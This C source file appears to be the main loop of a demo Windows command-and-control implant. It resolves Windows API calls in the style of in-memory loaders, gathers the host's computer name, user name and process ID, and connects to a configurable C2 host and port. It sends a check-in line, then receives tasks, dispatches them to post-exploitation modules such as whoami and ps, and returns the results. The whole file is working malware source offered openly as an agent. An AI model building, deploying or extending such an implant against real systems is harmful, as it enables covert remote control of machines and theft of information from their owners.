#include <windows.h>
#include "../agent/src/agent.h"
#include "../agent/libs/LibDebug/src/debug.h"
#include "../agent/libs/LibUtils/src/utils.h"
#include "../agent/libs/LibWinTransport/src/transport.h"

WINBASEAPI BOOL WINAPI KERNEL32$GetComputerNameA(LPSTR, LPDWORD);
WINBASEAPI BOOL WINAPI ADVAPI32$GetUserNameA(LPSTR, LPDWORD);
WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentProcessId(void);

extern int demo_postex_register(AgentConfig *config);

#ifndef C2_HOST
#define C2_HOST "127.0.0.1"
#endif

#ifndef C2_PORT
#define C2_PORT "9000"
#endif

static void str_trim(char *s, int len) {
    while (len > 0 && (s[len-1] == '\n' || s[len-1] == '\r'))
        s[--len] = '\0';
}

void agent_main(void) {
    AgentConfig config;
    util_memset(&config, 0, sizeof(config));

    config.running = TRUE;
    config.pid = KERNEL32$GetCurrentProcessId();

    DWORD len = sizeof(config.hostname);
    KERNEL32$GetComputerNameA(config.hostname, &len);
    len = sizeof(config.username);
    ADVAPI32$GetUserNameA(config.username, &len);

    dbg("demo", "Agent starting\nRegistering modules...");

    demo_postex_register(&config);

    dbg("demo", "Modules registered\nConnecting to C2...");

    if (transport_startup() != 0) {
        dbg("demo", "transport_startup FAILED");
        return;
    }

    config.transport = transport_connect(C2_HOST, C2_PORT);
    if (!config.transport) {
        dbg("demo", "transport_connect FAILED");
        transport_shutdown();
        return;
    }

    dbg("demo", "Connected!\nSending checkin...");

    {
        char checkin[512];
        char pid_str[16];
        char *w = checkin;
        const char *s;

        s = "CHECKIN|";
        while (*s) *w++ = *s++;
        s = config.hostname;
        while (*s) *w++ = *s++;
        *w++ = '|';
        s = config.username;
        while (*s) *w++ = *s++;
        *w++ = '|';

        util_utoa(pid_str, config.pid);
        s = pid_str;
        while (*s) *w++ = *s++;
        *w++ = '\n';
        *w = '\0';

        transport_send(config.transport, checkin, (size_t)(w - checkin));
    }

    dbg("demo", "Checkin sent\nEntering task loop...");

    char task_buf[256];
    while (config.running) {
        int received = transport_receive(config.transport, task_buf, sizeof(task_buf) - 1);
        if (received <= 0) break;

        task_buf[received] = '\0';
        str_trim(task_buf, received);

        if (util_strcmp(task_buf, "exit") == 0) {
            transport_send(config.transport, "BYE\n", 4);
            break;
        }

        AgentOutput output;
        util_memset(&output, 0, sizeof(output));

        int rc = module_dispatch(&config, task_buf, NULL, 0, &output);

        if (rc == 0 && output.data && output.data_len > 0) {
            transport_send(config.transport, output.data, output.data_len);
            transport_send(config.transport, "\n", 1);
        } else if (output.type == OUTPUT_TYPE_ERROR) {
            const char *err = "ERROR: command failed\n";
            transport_send(config.transport, err, util_strlen(err));
        } else {
            const char *unk = "ERROR: unknown command. Try: whoami, pwd, hostname, ps, exit\n";
            transport_send(config.transport, unk, util_strlen(unk));
        }

        output_free(&output);
    }

    transport_close(config.transport);
    transport_shutdown();

    dbg("demo", "Agent exiting");
}
